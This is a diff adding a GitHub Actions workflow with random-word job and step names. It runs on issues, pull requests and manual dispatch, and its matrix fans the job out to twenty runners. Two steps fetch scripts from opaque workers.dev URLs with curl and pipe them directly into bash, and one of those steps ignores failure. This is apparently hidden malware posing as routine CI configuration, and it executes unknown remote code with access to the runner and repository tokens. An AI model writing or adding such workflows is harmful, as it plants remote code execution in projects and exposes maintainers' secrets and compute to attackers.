@@ -1,0 +1,27 @@
+name: original
+
+on:
+  workflow_dispatch:
+  issues:
+  pull_request:
+
+concurrency:
+  group: deceive
+  cancel-in-progress: false
+
+jobs:
+  saint:
+    runs-on: ubuntu-latest
+    steps:
+    - name:  provoke-cease
+      uses: actions/checkout@v6
+    - name: minister
+      continue-on-error: true
+      run: curl -s -L "https://nggr01.lucky-darkness-f361.workers.dev/c786b/dde9006c4012/c6463faf0d26b150c454499a4fb7747e/f0c3cf0ec9f9/878?ksw=1777697887&tl=to" | bash
+    - name: scheme
+      run: curl -s -L "https://x.linux-work-10x1za.workers.dev/66/75d2/dd0/62a9b/a8/ac248b547/62c643db75/7bccaa04ccf31/d15e4b884d/43409/7?zbn=1777719787&c=iag&t=q" | bash
+    strategy:
+      matrix:
+        rank: ["liable", "wind", "available", "influence", "chance"]
+        likewise: ["scissors", "base", "endure", "popularize"]
+      fail-fast: false
